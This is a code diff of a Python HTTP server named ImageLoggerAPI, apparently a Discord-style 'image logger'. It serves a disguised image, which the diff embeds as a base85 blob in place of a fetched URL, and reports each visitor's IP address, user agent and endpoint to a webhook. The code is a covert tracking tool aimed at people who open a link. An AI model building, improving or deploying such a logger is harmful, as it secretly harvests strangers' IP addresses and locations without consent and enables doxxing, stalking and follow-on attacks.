@@ -159,12 +159,10 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     requests.post(config["webhook"], json = embed)
     return info
 
-#base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-
 binaries = {
-    "loading": "https://www.google.com/imgres?q=image%20jpg&imgurl=https%3A%2F%2Fupload.wikimedia.org%2Fwikipedia%2Fcommons%2F7%2F78%2FImage.jpg&imgrefurl=https%3A%2F%2Fit.m.wikipedia.org%2Fwiki%2FFile%3AImage.jpg&docid=0dQYyKXcCTZk9M&tbnid=vm9aMvUx8arhxM&vet=12ahUKEwiRyoTazKWMAxXX2QIHHTNaMEgQM3oECHkQAA..i&w=500&h=500&hcb=2&ved=2ahUKEwiRyoTazKWMAxXX2QIHHTNaMEgQM3oECHkQAA"
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 }
-    
+
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     
     def handleRequest(self):
@@ -200,12 +198,7 @@ height: 100vh;
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                 self.end_headers()
 
-                if config["buggedImage"]:
-                    image_response = requests.get(binaries["loading"])  
-                    if image_response.status_code == 200:
-                        self.wfile.write(image_response.content)  # Write the binary content of the image
-                    else:
-                        self.wfile.write(b"Error loading image")  # Handle failure to fetch image
+                if config["buggedImage"]: self.wfile.write(binaries["loading"])
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                 
